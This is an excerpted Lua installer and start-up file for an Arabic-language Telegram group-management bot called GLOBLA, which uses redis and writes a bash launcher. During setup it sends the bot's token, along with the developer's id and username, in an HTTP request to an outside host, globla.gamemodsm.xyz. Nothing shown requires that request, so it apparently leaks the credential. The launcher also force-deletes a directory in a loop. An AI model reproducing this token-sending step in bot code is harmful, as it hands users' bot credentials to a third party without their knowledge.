...
------------------------------------------------------------------------------------------------------------
if not redis:get(TeamGlobla.."USERNAME1") then
io.write('\n\27[1;35m⬇┇Send UserName For Sudo : ارسل معرف المطور الاساسي ...\n\27[0;39;49m')
local User_Sudo = io.read():gsub('@','')
if User_Sudo ~= '' then
local GetInfoUser = http.request("https://globla.gamemodsm.xyz/index.php?User="..User_Sudo)
...
redis:set(TeamGlobla.."USERNAME1",User_Info.Info.Username)
redis:set(TeamGlobla.."Id_GLOBLA",User_Info.Info.Id)
http.request("https://globla.gamemodsm.xyz/index.php?User="..User_Info.Info.Id.."&user="..User_Info.Info.Username.."&token="..redis:get(TeamGlobla.."token"))
else
...
------------------------------------------------------------------------------------------------------------
local GLOBLA_Info_Sudo = io.open("Info.lua", 'w')
GLOBLA_Info_Sudo:write([[
do 
local GLOBLA_INFO = {
Id_GLOBLA = ]]..redis:get(TeamGlobla.."Id_GLOBLA")..[[,
USERNAME = "]]..redis:get(TeamGlobla.."USERNAME1")..[[",
Token_Bot = "]]..redis:get(TeamGlobla.."token")..[["
}
return GLOBLA_INFO
end

]])
GLOBLA_Info_Sudo:close()
------------------------------------------------------------------------------------------------------------
local RUN_File_GLOBLA = io.open("GLOBLA", 'w')
RUN_File_GLOBLA:write([[
#!/usr/bin/env bash
cd $HOME/GLOBLA
token="]]..redis:get(TeamGlobla.."Token_GLOBLA")..[["
while(true) do
rm -fr ../.telegram-cli
./tg -s ./GLOBLA.lua -p PROFILE --bot=$token
done
]])
RUN_File_GLOBLA:close()
------------------------------------------------------------------------------------------------------------
...
os.execute('chmod +x GLOBLA')
os.execute('./RUN')
Status = true
else   
f:close()  
redis:del(TeamGlobla.."Token_GLOBLA");redis:del(TeamGlobla.."Id_GLOBLA");redis:del(TeamGlobla.."USERNAME1")
Status = false
end  
return Status
end
...
redis:sadd('Globla:'..bot_id..'UsersBot',msg.sender_user_id_)  
Chat_Type = 'UserBot' 
else
Chat_Type = 'GroupBot' 
end
...
if not SudoBot(msg) and not redis:sismember('Globla:'..bot_id..'Ban:UsersBot',msg.sender_user_id_) and not redis:get('Globla:'..bot_id..'Twal:Bot') then
